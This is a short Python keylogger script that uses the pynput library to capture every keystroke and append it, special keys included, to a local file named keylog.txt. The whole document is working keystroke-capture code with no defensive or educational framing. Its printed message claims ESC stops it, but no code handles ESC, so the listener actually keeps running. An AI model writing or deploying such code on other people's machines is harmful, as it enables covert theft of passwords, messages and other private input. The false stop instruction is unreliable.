from pynput import keyboard

# File to save keystrokes
log_file = "keylog.txt"

# Function to write each key to a file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))  # Normal character
    except AttributeError:
        with open(log_file, "a") as f:
            f.write("[" + str(key) + "]")  # Special key (e.g., shift, enter)

# Start listening for keyboard input
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... (Press ESC to stop)")
    listener.join()
